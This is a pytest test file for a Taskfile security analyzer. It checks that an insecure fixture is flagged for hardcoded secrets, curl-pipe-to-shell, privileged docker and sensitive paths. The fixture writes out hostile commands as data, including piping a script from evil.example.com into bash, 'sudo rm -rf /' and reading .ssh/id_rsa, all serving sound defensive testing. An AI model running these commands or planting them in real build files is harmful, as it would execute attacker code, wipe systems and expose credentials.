"""Tests for TaskfileAnalyzer."""

from pathlib import Path

from devai.taskfile_analyzer import TaskfileAnalyzer, TaskfileFinding


INSECURE_TASKFILE = """
version: '3'

vars:
  API_KEY: supersecret-api-key-12345

env:
  DATABASE_PASSWORD: hardcoded-password

tasks:
  default:
    cmds:
      - curl -fsSL http://evil.example.com/install.sh | bash
      - sudo rm -rf /
    env:
      GITHUB_TOKEN: ghp_hardcoded_token_value

  build:
    dotenv:
      - .env
    sources:
      - .ssh/id_rsa
      - credentials.json
    cmds:
      - docker run --privileged -v /var/run/docker.sock:/var/run/docker.sock app
      - curl -k https://example.com/data
"""

HARDENED_TASKFILE = """
version: '3'

vars:
  NODE_ENV: development

env:
  CI: "false"

tasks:
  default:
    desc: List tasks
    cmds:
      - task --list

  test:
    cmds:
      - python -m pytest
    sources:
      - src/**
      - tests/**
"""


class TestTaskfileAnalyzer:
    def test_no_taskfiles_returns_perfect_score(self, tmp_path: Path):
        (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
        analyzer = TaskfileAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()

    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / "Taskfile.yml").write_text(INSECURE_TASKFILE, encoding="utf-8")
        analyzer = TaskfileAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "curl_pipe_shell" in kinds
        assert "sensitive_path" in kinds
        assert "privileged_docker" in kinds
        assert "insecure_http" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_taskfile_scores_well(self, tmp_path: Path):
        (tmp_path / "Taskfile.yaml").write_text(HARDENED_TASKFILE, encoding="utf-8")
        analyzer = TaskfileAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert not any(f.severity == "high" for f in findings)
        assert analyzer.stats.configs == 1
        assert "test" in analyzer.infos[0].tasks

    def test_summary_context_and_template(self, tmp_path: Path):
        (tmp_path / "Taskfile.yml").write_text(HARDENED_TASKFILE, encoding="utf-8")
        analyzer = TaskfileAnalyzer(str(tmp_path))
        assert "Taskfiles:" in analyzer.summary()
        assert "Taskfile analysis" in analyzer.to_context()
        config = analyzer.generate_hardened_config()
        assert "version: '3'" in config

    def test_finding_format(self):
        finding = TaskfileFinding(
            kind="curl_pipe_shell",
            severity="high",
            message="unsafe",
            path="Taskfile.yml",
            lineno=2,
        )
        assert "Taskfile.yml:2" in finding.format()
